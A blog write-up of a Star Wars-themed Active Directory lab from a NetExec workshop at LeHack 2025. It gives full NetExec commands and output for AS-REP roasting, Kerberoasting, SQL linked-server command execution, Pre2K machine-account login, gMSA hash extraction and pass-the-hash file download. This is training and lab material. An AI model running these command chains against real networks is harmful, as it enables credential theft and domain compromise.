---
title: "NetExec Workshop LeHack 2025 - Comprehensive Guide"
date: 2025-06-28
draft: false
description: "A comprehensive guide to Active Directory exploitation with NetExec at LeHack 2025"
summary: "Comprehensive guide to Active Directory exploitation with NetExec at the LeHack 2025 workshop"
tags: ["ctf", "active-directory", "netexec", "workshop", "writeup"]
categories: ["CTF", "Active Directory"]
featuredImage: "featured.png"
images: ["featured.png"]
---

# Conquering the Galaxy: NetExec Workshop at LeHack 2025

*A Comprehensive Guide to Active Directory Exploitation with NetExec - LeHack 2025 Workshop*

---

## Table of Contents

1. [Introduction](#introduction)
2. [Why NetExec?](#why-netexec)
3. [Lab Architecture](#lab-architecture)
4. [Phase 1: Initial Reconnaissance](#phase-1-initial-reconnaissance)
5. [Phase 2: Credential Harvesting](#phase-2-credential-harvesting)
6. [Phase 3: Privilege Escalation](#phase-3-privilege-escalation)
7. [Phase 4: Lateral Movement](#phase-4-lateral-movement)
8. [Phase 5: Cross-Domain Exploitation](#phase-5-cross-domain-exploitation)
9. [Resources and References](#resources-and-references)
10. [Conclusion](#conclusion)

---

## Introduction

> **📌 Note:** The complete writeup of this workshop is available on [@LeandreOnizuka](https://x.com/LeandreOnizuka)'s website at [blog.anh4ckin.ch](https://blog.anh4ckin.ch/posts/netexec-workshop2k25/). He won this edition - huge GG to him! 🏆

On Saturday, June 28th, 2025, an exceptional **Active Directory penetration testing workshop** took place at **[LeHack 2025](https://x.com/0xdf_/status/1937820215472971880)**, expertly organized by **[@mpgn_x64](https://x.com/mpgn_x64)**, **[@zblurx](https://x.com/_zblurx)**, and **wil**. The workshop immersed participants in a multi-domain Active Directory environment with a captivating Star Wars theme.

**Lab Context:**
- **Event:** [LeHack 2025 workshop](https://x.com/0xdf_/status/1937820215472971880)
- **Organizers:** [@mpgn_x64](https://x.com/mpgn_x64), [@zblurx](https://x.com/_zblurx), and wil
- **Primary Tool:** [NetExec](https://www.netexec.wiki/)
- **Theme:** Star Wars (Empire vs Rebellion)
- **Objective:** Complete compromise of two AD domains

> **⚠️ Important Note:** This writeup covers the substantial portion completed during the workshop. Since the complete lab isn't yet publicly released, a second part will follow upon official release.

---

## Why NetExec?

### The Evolution from CrackMapExec

**NetExec** represents the natural evolution of CrackMapExec, becoming the reference tool for Active Directory assessments. Here's why it was chosen for this workshop:

#### Extended Protocol Coverage
```bash
# NetExec natively supports:
nxc smb <target>     # SMB/CIFS
nxc ldap <target>    # LDAP/LDAPS  
nxc mssql <target>   # Microsoft SQL Server
nxc rdp <target>     # Remote Desktop Protocol
nxc ssh <target>     # SSH
nxc winrm <target>   # Windows Remote Management
```

#### Flexible Authentication Methods
- **NTLM Hash**: Pass-the-Hash attacks
- **Kerberos Tickets**: Pass-the-Ticket and Golden/Silver tickets
- **Certificates**: Certificate-based authentication
- **Classic Credentials**: Username/Password

#### Powerful Modular Architecture
```bash
nxc <protocol> <target> -M <module>
# Examples of popular modules:
# --bloodhound : BloodHound data collection
# --asreproast : AS-REP Roasting
# --kerberoasting : Kerberoasting
# --shares : Share enumeration
```

**NetExec Resources:**
- [Official NetExec Documentation](https://github.com/Pennyw0rth/NetExec)
- [CrackMapExec → NetExec Migration Guide](https://github.com/Pennyw0rth/NetExec/wiki/CME-Migration-Guide)

---

## Lab Architecture

### Network Topology

Our galactic environment consists of two distinct Active Directory domains:

```
┌─────────────────────────────────────────────────────────────────────┐
│                        GALAXY NETWORK                               │
│                                                                     │
│  ┌─────────────────────┐              ┌─────────────────────┐      │
│  │   EMPIRE.LOCAL      │              │   REBELS.LOCAL      │      │
│  │                     │              │                     │      │
│  │  ┌───────────────┐  │              │  ┌───────────────┐  │      │
│  │  │   CORUSCANT   │  │              │  │     JEDHA     │  │      │
│  │  │  10.0.0.5     │◄─┼──────────────┼──┤  10.0.0.7     │  │      │
│  │  │   (DC)        │  │   TRUST?     │  │   (DC)        │  │      │
│  │  └───────────────┘  │              │  └───────────────┘  │      │
│  │                     │              │                     │      │
│  │  ┌───────────────┐  │              │  ┌───────────────┐  │      │
│  │  │   MUSTAFAR    │  │              │  │   DANTOOINE   │  │      │
│  │  │  10.0.0.6     │  │              │  │  10.0.0.8     │  │      │
│  │  │  (SQL Server) │  │              │  │  (Member)     │  │      │
│  │  └───────────────┘  │              │  └───────────────┘  │      │
│  └─────────────────────┘              └─────────────────────┘      │
└─────────────────────────────────────────────────────────────────────┘
```

#### Empire Domain (empire.local)
- **CORUSCANT** (10.0.0.5): Primary Domain Controller
- **MUSTAFAR** (10.0.0.6): Member server with SQL Server

#### Rebels Domain (rebels.local)  
- **JEDHA** (10.0.0.7): Primary Domain Controller
- **DANTOOINE** (10.0.0.8): Member server

---

## Phase 1: Initial Reconnaissance

### 1.1 User Discovery via RDP

Our first approach was to identify users present on the network via RDP connections with screenshot capture:

```bash
elliotbelt@Netexeclab:~$ nxc rdp targets --nla-screenshot
RDP         10.0.0.5        3389   coruscant        [*] Windows 10 or Windows Server 2016 Build 20348 (name:coruscant) (domain:empire.local) (nla:True)
RDP         10.0.0.7        3389   jedha            [*] Windows 10 or Windows Server 2016 Build 20348 (name:jedha) (domain:rebels.local) (nla:True)
RDP         10.0.0.8        3389   DANTOOINE        [*] Windows 10 or Windows Server 2016 Build 20348 (name:DANTOOINE) (domain:rebels.local) (nla:True)
RDP         10.0.0.6        3389   MUSTAFAR         [*] Windows 10 or Windows Server 2016 Build 20348 (name:MUSTAFAR) (domain:empire.local) (nla:False)
RDP         10.0.0.6        3389   MUSTAFAR         NLA Screenshot saved /root/.nxc/screenshots/MUSTAFAR_10.0.0.6_2025-06-29_000046.png
```

![MUSTAFAR RDP Screenshot](assets/images/MUSTAFAR_10.0.0.6_2025-06-28_212503.png)

**Why this technique works:**
- Many organizations leave RDP open for administration
- Screenshots often reveal information about connected users
- Allows identifying active accounts without authentication
- Notice that MUSTAFAR has **NLA disabled** (nla:False), allowing screenshot capture

This reconnaissance allowed us to identify two key users from the screenshot: **grievousssssss** and **krennic**.

### 1.2 Anonymous LDAP Enumeration Attempt

We then tested anonymous LDAP access to enumerate domain users:

```bash
nxc ldap targets -u '' -p '' --users
```

**Output received:**
```
LDAP        10.0.0.5        389    CORUSCANT        [*] Windows Server 2022 Build 20348 (name:CORUSCANT) (domain:empire.local) (signing:None) (channel binding:No TLS cert)
LDAP        10.0.0.5        389    CORUSCANT        [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090DA9, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4f7c
LDAP        10.0.0.7        389    JEDHA            [*] Windows Server 2022 Build 20348 (name:JEDHA) (domain:rebels.local) (signing:None) (channel binding:Never)
LDAP        10.0.0.7        389    JEDHA            [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090DA9, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4f7c
```

**Failure Analysis:**
- Both domains refuse anonymous LDAP connections
- However, we observe differences in configurations:
  - CORUSCANT: `signing:None` (LDAP signing not required)
  - JEDHA: `channel binding:Never` (channel binding never required)

This information indicates potential security misconfigurations exploitable later.

---

## Phase 2: Credential Harvesting

### 2.1 AS-REP Roasting Attack

Having no anonymous access, we attempted an **AS-REP Roasting attack** against the identified users:

```bash
nxc ldap targets -u users -p '' --asreproast asrep.out
```

#### AS-REP Roasting Principle

```
┌─────────────────┐           ┌─────────────────┐
│   ATTACKER      │           │ DOMAIN CONTROLLER│
│                 │           │   (CORUSCANT)    │
│                 │           │                 │
├─AS-REQ──────────┤──────────►│                 │
│ User: grievous  │           │ 1. Check if     │
│ No PreAuth      │           │    PreAuth req. │
│                 │           │                 │
│                 │◄──────────├─AS-REP──────────┤
│ 2. Receive hash │           │ User: grievous  │
│    Encrypted TGT│           │ Hash: $krb5...  │
│                 │           │                 │
├─Hashcat─────────┤           │                 │
│ Crack offline   │           │                 │
└─────────────────┘           └─────────────────┘
```

**Result Obtained:**
```
LDAP        10.0.0.5        389    CORUSCANT        [*] Windows Server 2022 Build 20348 (name:CORUSCANT) (domain:empire.local) (signing:None) (channel binding:No TLS cert)
LDAP        10.0.0.5        389    CORUSCANT        $krb5asrep$23$grievousssssss@EMPIRE.LOCAL:2f64456f739c11c5024c12c6023e3a27$d61c0c60fc76200164e4a8626158955318dd003bab2977026333ba260cfae5823ef9485ed43c7a121e41a2317dc26f2c2b0a2c6713c4d8a0f5bbf228ab748de412e54df4ac5058c2f3d6ec176739de545f7c7a84b4dc18cd7fb1bcbffedfb4c45c5c92b21fd39bb6d80c10617a18215d93606c306901266c5f0870c7c4eb728c0a4dccf3bc483c16825ae3fd557e3371ebda00319c7587e827a8fccf13851dc343d2fa78030100c67bafe715e9c0bcfd0c5eb41370176d6b1746fd51cb7e7aa3c02c42fa53a36c86cea44e72ae68ce01a5b0b2d9d3319993b76c240bbdbaab6c089f9f81ac8d9f60f7c304b1
```

#### Why This Attack Works

AS-REP Roasting exploits a specific AD misconfiguration:

1. **Vulnerable Configuration:** The `grievousssssss` account has the **"Do not require Kerberos preauthentication"** option enabled
2. **Exploitation Mechanism:** Without pre-authentication, anyone can request an AS-REP ticket for this user
3. **Cryptography:** The KDC returns a ticket encrypted with the user's password hash
4. **Offline Attack:** The hash can be cracked offline without detection risk

**AS-REP Roasting Resources:**
- [HackTricks - AS-REP Roasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)
- [ired.team - AS-REP Roasting](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

### 2.2 Hash Cracking Attempt

We attempted to crack the obtained hash with **Hashcat**:

```bash
hashcat -m 18200 asrep /usr/share/wordlists/rockyou.txt --force
```

**Hashcat Parameters:**
- `-m 18200`: Kerberos 5 AS-REP etype 23 mode
- `asrep`: File containing the hash
- `rockyou.txt`: Standard wordlist
- `--force`: Force execution despite warnings

**Cracking Failure:** Unfortunately, the hash couldn't be cracked with the rockyou wordlist within the workshop timeframe. However, this didn't stop our progress.

### 2.3 Leveraging AS-REP Roastable Account

**Key Insight:** Even without cracking the AS-REP hash, knowing that **grievousssssss** is AS-REP roastable means the account has "Do not require Kerberos preauthentication" enabled. This configuration can be leveraged for **Kerberoasting attacks** even without knowing the account's password.

---

## Phase 3: Privilege Escalation

### 3.1 Kerberoasting via AS-REP Roasting

Since we identified that **grievousssssss** has pre-authentication disabled, we leveraged a sophisticated technique called **"Kerberoasting via AS-REP Roasting"**:

```bash
nxc ldap targets -u grievousssssss -p '' --no-preauth-targets users --kerberoasting output.txt
```

**Why this advanced technique works:**

This command combines two powerful attack methods:
- **`--no-preauth-targets users`**: Uses the AS-REP roastable account (grievousssssss) to target users for Kerberoasting
- **`--kerberoasting output.txt`**: Requests TGS tickets for accounts with SPNs and saves them for offline cracking

**Technical Process:**
1. **AS-REP Authentication**: NetExec uses the grievousssssss account (no pre-auth required) to authenticate
2. **SPN Enumeration**: Searches for user accounts with Service Principal Names (SPNs)
3. **TGS Request**: Requests service tickets for discovered SPNs using the authenticated session
4. **Hash Extraction**: Extracts and saves the TGS hashes for offline cracking

**Why this is more effective than standard Kerberoasting:**
- No need to crack the AS-REP hash first
- Direct access to Kerberoasting using the pre-auth bypass
- Single command achieves both authentication and ticket extraction

#### Kerberoasting Principle

```
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│   ATTACKER      │     │ DOMAIN CONTROLLER│     │ SERVICE ACCOUNT │
│                 │     │   (CORUSCANT)    │     │   (krennic)     │
│                 │     │                 │     │                 │
├─TGS-REQ─────────┤────►│                 │     │                 │
│SPN: krennic     │     │ 1. Verify SPN   │     │                 │
│User: grievous   │     │ 2. Generate TGS │     │                 │
│                 │     │ 3. Encrypt with │     │                 │
│                 │◄────├─TGS-REP─────────│     │                 │
│TGS encrypted    │     │                 │     │                 │
│with SPN password│     │                 │     │                 │
│                 │     │                 │     │                 │
├─Hashcat─────────┤     │                 │     │                 │
│Crack offline    │     │                 │     │                 │
└─────────────────┘     └─────────────────┘     └─────────────────┘
```

**Kerberoasting Hash Obtained:**
```
$krb5tgs$23*krennic$EMPIRE.LOCAL$krennic*$4748b8d3ef1413465ca93e156041b9f1$...
```

#### Why Kerberoasting Works

1. **Service Principal Names (SPNs):** Service accounts have SPNs registered in AD
2. **Legitimate Request:** Any authenticated user can request a service ticket (TGS)
3. **Weak Encryption:** The TGS is encrypted with the service account's password hash
4. **Offline Attack:** The ticket can be cracked without domain interaction

**Successful Cracking:** The **krennic** hash was successfully cracked to: `liu8Sith`

**Kerberoasting Resources:**
- [MITRE ATT&CK - T1558.003](https://attack.mitre.org/techniques/T1558/003/)
- [SpecterOps - Roasting AS-REPs](https://posts.specterops.io/roasting-as-reps-e6179a65216b)

### 3.2 Complete Domain Enumeration

With **krennic** credentials, we proceeded to exhaustive enumeration:

```bash
nxc ldap 10.0.0.5 -u krennic -p 'liu8Sith' --users
```

**Significant Results:**
- **123 users** in the empire.local domain
- Administrative accounts: localadmin, palpatine, tarkin
- Service accounts: krbtgt, krennic  
- Bulk accounts: fn2100-fn2236 (possible test/service accounts)
- High-value targets: vader, thrawn, sidious

### 3.3 BloodHound Data Collection

To map complex AD relationships, we collected data for **BloodHound** (but we did not use this data for later exploitation):

```bash
nxc ldap 10.0.0.5 -u krennic -p 'liu8Sith' --bloodhound --collection All --dns-server 10.0.0.5
```

**Data Collected:**
- Trust relationships between domains
- Group memberships (including nested)  
- Local administration rights
- Active user sessions
- Potential attack paths

**BloodHound Resources:**
- [BloodHound Documentation](https://bloodhound.readthedocs.io/)
- [BloodHound Cheat Sheet](https://github.com/CompassSecurity/BloodHoundQueries)

---

## Phase 4: Lateral Movement

### 4.1 RDP Access Testing

We tested RDP access with krennic credentials:

```bash
nxc rdp targets -u krennic -p 'liu8Sith'
```

**Results:**
```
RDP         10.0.0.5        3389   coruscant        [+] empire.local\krennic:liu8Sith 
RDP         10.0.0.6        3389   MUSTAFAR         [+] empire.local\krennic:liu8Sith 
```

But we could not RDP :/

### 4.2 SQL Server Exploitation

Discovering a SQL server on MUSTAFAR opened new opportunities:

```bash
nxc mssql 10.0.0.6 -u krennic -p 'liu8Sith' -M enum_logins
```

**SQL Logins Discovered:**
```
ENUM_LOGINS 10.0.0.6        1433   MUSTAFAR         Login Name                          Type            Status
ENUM_LOGINS 10.0.0.6        1433   MUSTAFAR         ----------                          ----            ------
ENUM_LOGINS 10.0.0.6        1433   MUSTAFAR         EMPIRE\krennic                      Domain User     ENABLED
ENUM_LOGINS 10.0.0.6        1433   MUSTAFAR         droideka                            SQL User        ENABLED
ENUM_LOGINS 10.0.0.6        1433   MUSTAFAR         sa                                  SQL User        DISABLED
```

#### Default Credentials Testing

**Why we test default credentials:** SQL servers often have local accounts created with weak or default passwords, especially in lab environments or quick deployments. The username "droideka" suggested it might be a custom account that could follow poor password practices.

Our default credentials test proved successful:

```bash
nxc mssql targets -u droideka -p 'droideka' --local-auth
```

```
MSSQL       10.0.0.6        1433   MUSTAFAR         [+] MUSTAFAR\droideka:droideka
```

### 4.3 Linked Server Attack

The most critical discovery was the exploitation of **SQL linked servers**:

```bash
nxc mssql 10.0.0.6 -u droideka -p 'droideka' --local-auth -M link_xpcmd -o LINKED_SERVER='DANTOOINE\SQLEXPRESS' CMD='whoami'
```

#### Linked Server Principle

```
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│   ATTACKER      │     │    MUSTAFAR     │     │   DANTOOINE     │
│                 │     │  (SQL Server)   │     │ (Linked Server) │
│                 │     │                 │     │                 │
├─NetExec─────────┤────►│                 │     │                 │
│Command: whoami  │     │ 1. Receive cmd  │     │                 │
│User: droideka   │     │ 2. Use          │────►│ 3. Execute as   │
│                 │     │    Linked Server│     │    SYSTEM       │
│                 │◄────├─Result──────────┤◄────├─nt service\     │
│nt service\mssql │     │                 │     │  mssql$sqlexpr  │
│$sqlexpress      │     │                 │     │                 │
└─────────────────┘     └─────────────────┘     └─────────────────┘
```

**Executed Commands:**
```bash
# Identification
nxc mssql 10.0.0.6 -u droideka -p 'droideka' --local-auth -M link_xpcmd -o LINKED_SERVER='DANTOOINE\SQLEXPRESS' CMD='whoami'
# Result: nt service\mssql$sqlexpress

# User enumeration
nxc mssql 10.0.0.6 -u droideka -p 'droideka' --local-auth -M link_xpcmd -o LINKED_SERVER='DANTOOINE\SQLEXPRESS' CMD='dir C:\Users'

# Local administrators enumeration  
nxc mssql 10.0.0.6 -u droideka -p 'droideka' --local-auth -M link_xpcmd -o LINKED_SERVER='DANTOOINE\SQLEXPRESS' CMD='net localgroup administrators'
```

#### Critical Discoveries

```
# Local administrators on DANTOOINE
Alias name     administrators
Members
-------------------------------------------------------------------------------
localadmin
REBELS\poe    ← Cross-domain user!
```

### 4.4 Intelligence Gathering

File exploration via the linked server revealed sensitive information:

```bash
nxc mssql 10.0.0.6 -u droideka -p 'droideka' --local-auth -M link_xpcmd -o LINKED_SERVER='DANTOOINE\SQLEXPRESS' CMD='dir C:\rebels_plan'
```

```
Directory of C:\rebels_plan
06/24/2025  07:59 PM                86 plans.txt
```

```bash
nxc mssql 10.0.0.6 -u droideka -p 'droideka' --local-auth -M link_xpcmd -o LINKED_SERVER='DANTOOINE\SQLEXPRESS' CMD='type C:\rebels_plan\plans.txt'
```

**File content:**
```
Our next base is located in a place called "endor", this is a top secret information !
```

This intelligence provides us with the keyword **"endor"** which will be crucial for the next phase.

**Linked Server Resources:**
- [Microsoft Docs - Linked Servers](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-engine)
- [NetSPI - SQL Server Link Crawling](https://blog.netspi.com/how-to-hack-database-links-in-sql-server/)

---

## Phase 5: Cross-Domain Exploitation

### 5.1 Pre2K Computer Account Authentication

Using the collected intelligence from the **rebels_plan** file, we identified that **"endor"** was mentioned as a secret location. This gave us a hint to test if **"endor"** was a **Pre2K computer account**.

```bash
nxc smb targets -u endor$ -p endor -k --generate-tgt ticket
```

#### Pre2K Computer Account Vulnerability

**What is a Pre2K Computer Account?**

Pre-Windows 2000 computer accounts are legacy accounts created for backward compatibility. These accounts have a critical security weakness:
- **Password = Computer Name**: The password is set to the computer name (lowercase, without the $ suffix)
- **No Auto-Rotation**: Unlike modern computer accounts, these passwords don't rotate automatically
- **Kerberos Compatible**: They can authenticate via Kerberos without password changes

**Recent Research by mpgn:**
As highlighted in [mpgn's tweet from June 25th, 2025](https://twitter.com/mpgn_x64):
> *"you don't need to change the password of a pre2k computer account, just use kerberos ex: `nxc smb ip -u server$ -p server -k`"*

#### Why the `-k` Flag is Crucial

The **`-k` (Kerberos)** flag enables several key advantages:

1. **Direct Kerberos Authentication**: Bypasses NTLM authentication challenges
2. **No Password Modification**: Avoids triggering security events from password changes
3. **TGT Generation**: Creates reusable Ticket Granting Tickets for other tools
4. **Stealth Operations**: Kerberos authentication is less suspicious than repeated NTLM attempts

#### Attack Flow

```
┌─────────────────┐           ┌─────────────────┐
│   ATTACKER      │           │ DOMAIN CONTROLLER│
│                 │           │     (JEDHA)      │
│                 │           │                 │
├─Kerberos────────┤──────────►│                 │
│User: endor$     │           │ 1. Verify Pre2K │
│Pass: endor      │           │    computer acc. │
│Flag: -k         │           │ 2. Generate TGT │
│                 │◄──────────├─TGT─────────────┤
│TGT for rebels   │           │ 3. Success!     │
│.local domain    │           │                 │
└─────────────────┘           └─────────────────┘
```

**Result:**
```
SMB         10.0.0.8        445    DANTOOINE        [+] rebels.local\endor$:endor 
SMB         10.0.0.7        445    jedha            [+] rebels.local\endor$:endor 
SMB         10.0.0.8        445    DANTOOINE        [+] TGT saved to: ticket.ccache
```

#### Why This Attack Succeeds

1. **Pre2K Legacy**: The `endor$` account was created as a Pre-Windows 2000 computer account
2. **Predictable Password**: Password follows the pattern: computer name (endor) in lowercase
3. **No Rotation**: Password hasn't changed since account creation
4. **Kerberos Compatibility**: The `-k` flag leverages Kerberos authentication without password modification

### 5.2 Cross-Domain Enumeration

With access to the rebels.local domain, we enumerated users:

```bash
nxc smb 10.0.0.7 -u endor$ -p endor --use-kcache --users
```

**Rebel Users Discovered:**
- luke, leia, han, obiwan (main characters)
- poe, finn, rey (sequel trilogy)
- jyn, cassian, bodhi (Rogue One)

### 5.3 gMSA (Group Managed Service Account) Exploitation

The most sophisticated discovery was **gMSA** password extraction:

```bash
nxc ldap 10.0.0.7 -u endor$ -p endor -k --gmsa
```

**Result:**
```
LDAP        10.0.0.7        389    JEDHA            [*] Getting GMSA Passwords
LDAP        10.0.0.7        389    JEDHA            Account: gMSA-scarif$         NTLM: 889c32ef466ff6b367cf8adf7fce539b     PrincipalsAllowedToReadPassword: ENDOR$
```

#### What are Group Managed Service Accounts (gMSA)?

**gMSAs** are a critical Windows Server feature designed to provide automatic password management for service accounts:

**Key Characteristics:**
- **Automatic Password Management**: Passwords are 240 characters long, complex, and automatically rotated every 30 days
- **No Human Intervention**: No manual password changes or service restarts required
- **Cryptographically Strong**: Uses the Key Distribution Service (KDS) root key
- **Domain-Wide Availability**: Password can be retrieved by authorized principals across the domain

**Why gMSA-scarif$ is Critical:**

The name **"scarif"** references the Imperial security complex from Rogue One - suggesting this gMSA has **high-privilege access** to sensitive systems or data. This is confirmed by our ability to access the **Destroyer_Access** share, indicating the account has elevated permissions.

#### gMSA Exploitation Flow

```
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│   ATTACKER      │     │ DOMAIN CONTROLLER│     │   gMSA ACCOUNT  │
│  (endor$)       │     │     (JEDHA)      │     │  (gMSA-scarif$) │
│                 │     │                 │     │                 │
├─LDAP Query──────┤────►│                 │     │                 │
│Request gMSA pwd │     │ 1. Check if     │     │                 │
│User: endor$     │     │    endor$ is in │     │                 │
│                 │     │    'PrincipalsAl-│     │                 │
│                 │     │    lowedToRead' │     │                 │
│                 │     │ 2. Query KDS    │     │                 │
│                 │◄────├─NTLM Hash───────┤     │ 3. Derive from  │
│889c32ef466...   │     │ 3. Return       │     │    KDS root key │
│                 │     │    current hash │     │                 │
└─────────────────┘     └─────────────────┘     └─────────────────┘
```

#### Why This gMSA Extraction Succeeds

1. **Authorized Principal**: ENDOR$ is explicitly configured in the `PrincipalsAllowedToReadPassword` attribute
2. **KDS Access**: The Domain Controller can derive the current password using the KDS root key
3. **Legitimate Operation**: This is how the Windows service would retrieve the password for authentication
4. **Pass-the-Hash Ready**: The retrieved NTLM hash can be used immediately for authentication

#### Security Implications

Finding this gMSA reveals several critical insights:
- **High-Value Service**: The "scarif" naming suggests access to classified/sensitive systems
- **Misconfigured Permissions**: ENDOR$ (a potentially compromised pre2K account) can read gMSA passwords
- **Privilege Escalation Path**: gMSA accounts often have elevated permissions for service operations
- **Persistence Opportunity**: gMSA passwords rotate, but we can re-extract them as long as we maintain ENDOR$ access

**gMSA Resources:**
- [Microsoft Docs - Group Managed Service Accounts](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview)
- [SpecterOps - gMSA Attacks](https://posts.specterops.io/the-attack-path-management-manifesto-3a3b117f5e5)
- [Attacking gMSA Passwords - Semperis](https://www.semperis.com/blog/attacking-group-managed-service-accounts/)

### 5.4 Access to Sensitive Resources

The gMSA hash gave us access to critical shares:

```bash
nxc smb 10.0.0.8 -u gMSA-scarif$ -H 889c32ef466ff6b367cf8adf7fce539b --shares
```

**Shares Discovered:**
```
SMB         10.0.0.8        445    DANTOOINE        Share           Permissions     Remark
SMB         10.0.0.8        445    DANTOOINE        Destroyer_Access READ            
```

#### Data Exfiltration

```bash
nxc smb 10.0.0.8 -u gMSA-scarif$ -H 889c32ef466ff6b367cf8adf7fce539b -M spider_plus -o DOWNLOAD_FLAG=True
```

**Critical Files Discovered:**
- **info.txt:** "Access key for the ship ! Also, stop taking note, it can be unsafe, you never know ..."
- **poe.pfx:** Certificate file for user poe

#### What is a PFX Certificate?

A **PFX (Personal Information Exchange)** file is a binary format for storing cryptographic objects including:
- **Private key** and corresponding **public key certificate**
- **Certificate chain** (if applicable)
- **Password protection** (typically)

In Active Directory environments, PFX certificates can be used for:
- **Client authentication** to domain services
- **Smart card logon** 
- **Code signing**
- **SSL/TLS authentication**

The discovery of **poe.pfx** suggests this certificate could be used to authenticate as the **poe** user, potentially providing another avenue for privilege escalation within the rebels.local domain.

---

## Resources and References

### Technical Documentation
- [NetExec GitHub Repository](https://github.com/Pennyw0rth/NetExec)

---

## Conclusion

This NetExec workshop at LeHack 2025 demonstrated the power and versatility of this tool for Active Directory assessments. Through a captivating Star Wars-themed environment, we explored advanced attack techniques and their real-world implications.

### Techniques Mastered
- ✅ **AS-REP Roasting**: Exploiting accounts without Kerberos pre-authentication
- ✅ **Kerberoasting**: Service ticket extraction and cracking
- ✅ **SQL Linked Server Attacks**: Lateral movement via SQL configurations
- ✅ **Machine Account Exploitation**: Abusing misconfigured machine accounts
- ✅ **gMSA Password Extraction**: Retrieving managed service account passwords

### Future Work

Unfortunately, **progress only reached the discovery of the poe.pfx certificate** before the workshop session ended.

**What we accomplished:**
- Significant foothold in the empire.local domain
- Initial foothold in rebels.local domain  
- Discovery of cross-domain trust relationships
- Identification of certificate-based authentication opportunities

**What's next:**
The **public release of the complete lab** is eagerly awaited to continue this exploitation chain. The discovery of the poe.pfx certificate suggests the attack is on the verge of:
- **Certificate-based authentication** as the poe user
- **Potential privilege escalation** within rebels.local
- **Complete cross-domain compromise**
- **Advanced persistence techniques**

### Key Takeaways

1. **Cascading Misconfigurations**: A single weak configuration can lead to complete domain compromise
2. **Cross-Protocol Excellence**: NetExec's multi-protocol support makes it invaluable for complex environments
3. **Intelligence-Driven Attacks**: Systematic enumeration reveals unexpected attack paths
4. **Time Management**: Even 4 hours can yield significant progress with the right tools and methodology

### Acknowledgments

A huge thank you to **[@mpgn_x64](https://x.com/mpgn_x64)**, **[@zblurx](https://x.com/_zblurx)**, and **wil** for organizing this exceptional workshop and to the **LeHack community** for this learning opportunity. The Star Wars theme made learning AD attack techniques particularly memorable and engaging.

GG to **[@anh4ckin3](https://x.com/anh4ckin3)** for completing the full lab! 🎉 For the complete advanced exploitation chain and the rest of this writeup, check out his excellent blog post: **[NetExec Workshop Active Directory Lab Writeup](https://blog.anh4ckin.ch/posts/netexec-workshop2k25/)**

The discovery of the poe.pfx certificate leaves a perfect cliffhanger - this writeup will be completed once the lab becomes available locally for the full exploitation chain.

---